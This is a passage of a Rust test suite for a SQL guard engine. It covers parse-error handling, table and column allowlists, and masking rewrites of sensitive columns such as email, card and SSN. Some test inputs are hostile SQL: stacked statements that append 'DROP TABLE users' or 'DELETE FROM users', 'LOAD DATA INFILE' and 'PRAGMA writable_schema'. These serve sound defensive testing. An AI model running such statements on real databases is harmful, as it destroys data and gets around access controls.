        ..EnforcementPolicy::default()
    };
    let cases = [
        ("default", EnforcementPolicy::default(), Decision::Flag),
        ("parse_error: block", closed, Decision::Block),
        ("monitor", monitor.clone(), Decision::Flag),
        ("ci cap", ci.clone(), Decision::Flag),
        (
            "mask tag",
            tagged(EnforcementPolicy::default()),
            Decision::Block,
        ),
        ("mask tag + monitor", tagged(monitor), Decision::Block),
        (
            "enforced allowlist",
            enforced_agent(EnforcementPolicy::default()),
            Decision::Block,
        ),
        (
            "enforced allowlist + ci cap",
            enforced_agent(ci),
            Decision::Block,
        ),
    ];
    for (label, policy, want) in cases {
        for sql in [
            UNPARSEABLE,
            "DETACH DATABASE a b",
            "PRAGMA user_version = (SELECT 1)",
        ] {
            let o = sl_with(sql, &policy);
            assert!(is_parse_error(&o), "{label}: {sql}: {o:?}");
            assert_eq!(o.decision, want, "{label}: {sql}");
        }
    }
    assert_eq!(
        EnforcementPolicy::default().effective_parse_error_for(UNPARSEABLE, Dialect::Sqlite),
        ParseErrorAction::AllowReport
    );
}

/// `parse_error_kind` tells an unknown statement from invalid SQL.
#[test]
fn parse_error_kind_is_reported() {
    for (sql, d, want) in [
        (
            "DETACH DATABASE a b",
            Dialect::Sqlite,
            ParseErrorKind::UnknownStatement,
        ),
        (
            "FROBNICATE users",
            Dialect::Sqlite,
            ParseErrorKind::UnknownStatement,
        ),
        (UNPARSEABLE, Dialect::Sqlite, ParseErrorKind::Syntax),
        (
            "SELECT id FROM users WHERE",
            Dialect::Mysql,
            ParseErrorKind::Syntax,
        ),
        (
            "LOAD DATA INFILE '/tmp/x' INTO TABLE t",
            Dialect::Mysql,
            ParseErrorKind::Syntax,
        ),
        (
            "CREATE MASKING POLICY m AS (v STRING) RETURNS STRING -> '***'",
            Dialect::Snowflake,
            ParseErrorKind::Syntax,
        ),
        ("SELEC 1", Dialect::Postgres, ParseErrorKind::Syntax),
    ] {
        let o = evaluate(sql, d, &catalogue(), &EnforcementPolicy::default());
        assert_eq!(o.parse_error_kind(), Some(want), "{sql} on {d:?}: {o:?}");
    }
    // A statement only recognised by its keywords, when its floor is the
    // outcome (no rule enabled): an unknown statement.
    let o = evaluate(
        "VACUUM INTO lower('/x')",
        Dialect::Sqlite,
        &[],
        &EnforcementPolicy::default(),
    );
    assert_eq!(
        o.parse_error_kind(),
        Some(ParseErrorKind::UnknownStatement),
        "{o:?}"
    );
    let deep = format!("SELECT {}1{}", "(".repeat(300), ")".repeat(300));
    let o = evaluate(
        &deep,
        Dialect::Sqlite,
        &catalogue(),
        &EnforcementPolicy::default(),
    );
    assert_eq!(o.parse_error_kind(), Some(ParseErrorKind::TooComplex));
    assert_eq!(
        ParseErrorKind::UnknownStatement.as_str(),
        "unknown_statement"
    );
    assert_eq!(ParseErrorKind::Syntax.as_str(), "syntax");
    assert_eq!(ParseErrorKind::TooComplex.as_str(), "too_complex");
    assert_eq!(
        serde_json::to_string(&ParseErrorKind::UnknownStatement).unwrap(),
        "\"unknown_statement\""
    );
    // Not a parse error: no kind.
    assert_eq!(sl("SELECT id FROM users LIMIT 1").parse_error_kind(), None);
    assert_eq!(sl("DELETE FROM users").parse_error_kind(), None);
}

/// A statement only the pre-classifier recognised by its keywords keeps the
/// parse-error outcome as a floor; one whose pattern covers the whole
/// statement is read.
#[test]
fn unread_code_keeps_the_parse_error_floor() {
    let closed = EnforcementPolicy {
        parse_error: ParseErrorAction::Block,
        ..EnforcementPolicy::default()
    };
    // No rule enabled: the recognised-but-unread statement is a parse error.
    for sql in [
        "VACUUM INTO lower('/x')",
        "ATTACH DATABASE 'enc.db' AS enc KEY 'secret'",
    ] {
        let none = evaluate(sql, Dialect::Sqlite, &[], &EnforcementPolicy::default());
        assert!(is_parse_error(&none), "{sql}: {none:?}");
        assert_eq!(none.decision, Decision::Flag);
        let none = evaluate(sql, Dialect::Sqlite, &[], &closed);
        assert_eq!(none.decision, Decision::Block, "{sql}");
    }
    // Read whole: no floor.
    for sql in [
        "VACUUM INTO '/tmp/x.db'",
        "PRAGMA foreign_keys = OFF",
        "DETACH reports",
    ] {
        let none = evaluate(sql, Dialect::Sqlite, &[], &closed);
        assert_eq!(none.decision, Decision::Allow, "{sql}: {none:?}");
    }
    // With the catalogue, the finding is reported and blocks.
    let o = sl("VACUUM INTO lower('/x')");
    assert_eq!(o.rule_code.as_deref(), Some("VERICTO-101"));
    assert_eq!(o.decision, Decision::Block);
}

/// The fallbacks read one statement only, and their patterns are anchored.
#[test]
fn fallbacks_are_anchored() {
    for sql in [
        // A second statement after a pragma: the whole text is a parse error.
        "PRAGMA foreign_keys = OFF; DELETE FROM users",
        "PRAGMA journal_mode = WAL; PRAGMA foreign_keys = ON",
        "DETACH reports; DROP TABLE users",
        "REINDEX a b",
        "DETACH",
        "PRAGMA table_info(users, x)",
    ] {
        let o = sl(sql);
        assert!(is_parse_error(&o), "{sql}: {o:?}");
    }
}

// ---------------------------------------------------------------------------
// VERICTO-087 identifier semantics (design §4.4)
// ---------------------------------------------------------------------------

fn agent(json: &str) -> EnforcementPolicy {
    EnforcementPolicy {
        access_policy: Some(serde_json::from_str::<AccessPolicy>(json).unwrap()),
        ..EnforcementPolicy::default()
    }
}

fn access(sql: &str, policy: &EnforcementPolicy) -> EvaluationOutcome {
    evaluate(sql, Dialect::Sqlite, &[], policy)
}

fn allowed(sql: &str, policy: &EnforcementPolicy) -> bool {
    let o = access(sql, policy);
    o.decision == Decision::Allow && o.access_denied.is_empty()
}

const ANALYST: &str = r#"{"mode":"enforce","entries":[
    {"table":"Orders","columns":"*","access":"read_write"},
    {"schema":"main","table":"customers","columns":["id","Name"]},
    {"table":"[Order Items]","columns":"*"},
    {"schema":"archive","table":"orders","columns":"*"},
    {"table":"pragma_table_info","columns":"*"}
]}"#;

#[test]
fn vericto_087_names_compare_case_insensitively() {
    let p = agent(ANALYST);
    for sql in [
        "SELECT * FROM orders",
        "SELECT * FROM ORDERS",
        "SELECT * FROM \"orders\"",
        "SELECT * FROM [Orders]",
        "SELECT * FROM `oRdErS`",
        "SELECT * FROM main.orders",
        "SELECT * FROM MAIN.Orders",
        "SELECT id, name FROM customers",
        "SELECT ID, NAME FROM [customers]",
        "SELECT \"Id\", \"name\" FROM \"Customers\"",
        "SELECT * FROM \"order items\"",
        "SELECT * FROM archive.orders",
        "INSERT INTO orders (id) VALUES (1)",
        "UPDATE ORDERS SET status = 'x' WHERE id = 1",
    ] {
        assert!(allowed(sql, &p), "{sql}: {:?}", access(sql, &p));
    }
    for sql in [
        // Another schema: `temp` and attached databases are not `main`.
        "SELECT * FROM temp.orders",
        "SELECT * FROM other.orders",
        // An ungranted column, in any spelling.
        "SELECT id, email FROM customers",
        "SELECT id FROM customers WHERE \"EMAIL\" LIKE 'a%'",
        // Read only.
        "UPDATE customers SET name = 'x' WHERE id = 1",
        "DELETE FROM archive.orders WHERE id = 1",
    ] {
        assert!(!allowed(sql, &p), "{sql} must be denied");
    }
}

#[test]
fn vericto_087_catalogue_and_table_functions() {
    let p = agent(ANALYST);
    // The catalogue needs an entry naming it.
    assert!(!allowed("SELECT name FROM sqlite_master", &p));
    assert!(!allowed("SELECT name FROM sqlite_schema", &p));
    // A table-valued function is read like a table of its name.
    assert!(allowed("SELECT * FROM pragma_table_info('orders')", &p));
    assert!(!allowed("SELECT * FROM pragma_index_list('orders')", &p));
    assert!(!allowed("SELECT * FROM dbstat", &p));
    // json_each reads only its argument.
    assert!(allowed(
        "SELECT o.id, j.value FROM orders o, json_each(o.items) j",
        &p
    ));
    assert!(!allowed(
        "SELECT j.value FROM customers c, json_each(c.email) j",
        &p
    ));
}

#[test]
fn vericto_087_pragmas_and_sqlite_statements() {
    let p = agent(ANALYST);
    for sql in [
        "PRAGMA table_info(orders)",
        "PRAGMA table_info('ORDERS')",
        "PRAGMA main.table_xinfo(orders)",
        "PRAGMA foreign_keys = ON",
        "PRAGMA foreign_keys",
        "PRAGMA busy_timeout = 5000",
        "PRAGMA journal_mode = WAL",
        "PRAGMA synchronous = NORMAL",
        "BEGIN IMMEDIATE",
        "COMMIT",
    ] {
        assert!(allowed(sql, &p), "{sql}: {:?}", access(sql, &p));
    }
    for (sql, what) in [
        ("PRAGMA table_info(secrets)", "secrets"),
        ("PRAGMA foreign_keys = OFF", "PRAGMA foreign_keys"),
        ("PRAGMA user_version", "PRAGMA user_version"),
        ("PRAGMA writable_schema = 1", "PRAGMA writable_schema"),
        ("ATTACH 'x.db' AS x", "ATTACH DATABASE"),
        ("DETACH x", "DETACH"),
        ("VACUUM", "VACUUM"),
        ("VACUUM INTO 'x.db'", "VACUUM INTO"),
        ("REINDEX", "REINDEX"),
        ("CREATE TABLE z (a)", "CREATE TABLE"),
    ] {
        let o = access(sql, &p);
        assert_eq!(o.decision, Decision::Block, "{sql}: {o:?}");
        assert!(
            o.access_denied.iter().any(|d| d.table == what),
            "{sql}: {:?}",
            o.access_denied
        );
    }
}

// ---------------------------------------------------------------------------
// VERICTO-085 mask rewrite (design §4.5): golden outputs
// ---------------------------------------------------------------------------

fn masked(tags: &str) -> EnforcementPolicy {
    EnforcementPolicy {
        sensitive_columns: serde_json::from_str::<Vec<SensitiveColumn>>(tags).unwrap(),
        ..EnforcementPolicy::default()
    }
}

const TAGS: &str = r#"[
    {"table":"customers","column":"email","policy":"mask","mask_style":"email"},
    {"table":"customers","column":"card","policy":"mask","mask_style":"last4"},
    {"table":"customers","column":"ssn","policy":"mask","mask_style":"hash"},
    {"table":"customers","column":"note","policy":"mask","mask_style":"full"},
    {"table":"customers","column":"pin","policy":"block"}
]"#;

const EMAIL_MASK: &str = "CASE WHEN length(CAST(email AS TEXT)) = 0 THEN CAST(email AS TEXT) WHEN instr(SUBSTR(CAST(email AS TEXT), 2), '@') > 0 THEN SUBSTR(CAST(email AS TEXT), 1, 1) || '***' || SUBSTR(CAST(email AS TEXT), instr(SUBSTR(CAST(email AS TEXT), 2), '@') + 1) ELSE SUBSTR(CAST(email AS TEXT), 1, 1) || '***' END";

fn rewrite(sql: &str) -> Option<String> {
    let o = evaluate(sql, Dialect::Sqlite, &[], &masked(TAGS));
    if o.rewritten_query.is_some() {
        assert_eq!(o.decision, Decision::Flag, "{o:?}");
        assert_eq!(o.rule_code.as_deref(), Some("VERICTO-085"));
    }
    o.rewritten_query
}

fn refused(sql: &str) -> String {
    let o = evaluate(sql, Dialect::Sqlite, &[], &masked(TAGS));
    assert_eq!(o.decision, Decision::Block, "{sql}: {o:?}");
    assert_eq!(o.rewritten_query, None);
    o.ast_node_path.unwrap_or_default()
}

#[test]
fn vericto_085_sqlite_golden_rewrites() {
    let golden: &[(&str, String)] = &[
        (
            "SELECT id, email FROM customers WHERE id = ?",
            format!("SELECT id, {EMAIL_MASK} AS email FROM customers WHERE id = ?"),
        ),
        (
            "SELECT card, note FROM customers WHERE id = ?1",
            "SELECT CASE WHEN length(CAST(card AS TEXT)) <= 8 THEN '[redacted]' ELSE '****' || SUBSTR(CAST(card AS TEXT), -4) END AS card, '[redacted]' AS note FROM customers WHERE id = ?1".to_string(),
        ),
        // The client's alias, and a bracketed or backticked name, are kept.
        (
            "SELECT email AS contact FROM customers",
            format!("SELECT {EMAIL_MASK} AS contact FROM customers"),
        ),
        (
            "SELECT [note] FROM customers",
            "SELECT '[redacted]' AS [note] FROM customers".to_string(),
        ),
        (
            "SELECT `note` FROM customers",
            "SELECT '[redacted]' AS `note` FROM customers".to_string(),
        ),
        // A qualified column keeps its own name; every placeholder style.
        (
            "SELECT c.note FROM customers c WHERE c.id = :id",
            "SELECT '[redacted]' AS note FROM customers c WHERE c.id = :id".to_string(),
        ),
        (
            "SELECT note FROM customers WHERE id = @id AND org = $org",
            "SELECT '[redacted]' AS note FROM customers WHERE id = @id AND org = $org"
                .to_string(),
        ),
        // A computed value, or one holding a bind parameter, is redacted in
        // place: `?` stays where it was.
        (
            "SELECT lower(note) AS n FROM customers",
            "SELECT '[redacted]' || coalesce(SUBSTR(CAST(lower(note) AS TEXT), 1, 0), '') AS n FROM customers".to_string(),
        ),
        (
            "SELECT email || ? AS e FROM customers WHERE id = ?",
            "SELECT '[redacted]' || coalesce(SUBSTR(CAST(email || ? AS TEXT), 1, 0), '') AS e FROM customers WHERE id = ?".to_string(),
        ),
        // Spellings SQLite reads alike (`!=`, keyword case, comments).
        (
            "select id, note from customers where id != 1 -- trailing",
            "SELECT id, '[redacted]' AS note FROM customers WHERE id <> 1".to_string(),
        ),
    ];
    for (sql, want) in golden {
        assert_eq!(rewrite(sql).as_deref(), Some(want.as_str()), "{sql}");
    }
}

#[test]
fn vericto_085_sqlite_refuses_what_it_cannot_rewrite() {
    for (sql, why) in [
        // Q7: no SHA-256 in core SQLite.
        ("SELECT ssn FROM customers WHERE id = 1", "SHA-256"),
        // DQS: a double-quoted name anywhere.
        ("SELECT \"note\" FROM customers", "double-quoted"),
        (
            "SELECT note FROM customers WHERE \"id\" = 1",
            "double-quoted",
        ),
        ("SELECT lower(email) FROM customers", "alias it"),
        ("SELECT note FROM customers ORDER BY note", "ORDER BY"),
        ("SELECT note FROM customers ORDER BY 1", "ORDER BY"),
        (
            "SELECT note, count(*) AS n FROM customers GROUP BY note",
            "GROUP BY",
        ),
        ("SELECT * FROM customers", "list the columns"),
        ("INSERT INTO copy SELECT note FROM customers", "copied"),
        // Read through a planner hint: the printed text is not the client's.
        (
            "SELECT note FROM customers INDEXED BY customers_note",
            "faithfully",
        ),
    ] {
        let path = refused(sql);
        assert!(path.contains(why), "{sql}: {path}");
    }
    // Block and flag tags count a double-quoted name as the column.
    let o = evaluate(
        "SELECT \"pin\" FROM customers",
        Dialect::Sqlite,
        &[],
        &masked(TAGS),
    );
    assert_eq!(o.decision, Decision::Block);
    assert_eq!(
        o.ast_node_path.as_deref(),
        Some("SensitiveColumn > customers.pin (block)")
    );
}

/// The rewrite is parsed back and must be the rewritten tree.
#[test]
fn vericto_085_sqlite_rewrite_reparses() {
    use sqlparser::dialect::SQLiteDialect;
    for sql in [
        "SELECT id, email, card, note FROM customers WHERE id = ?",
        "SELECT lower(note) AS n FROM customers WHERE id = :id",
    ] {
        let out = rewrite(sql).unwrap();
        sqlparser::parser::Parser::parse_sql(&SQLiteDialect {}, &out)
            .unwrap_or_else(|e| panic!("{out}: {e}"));
    }
}
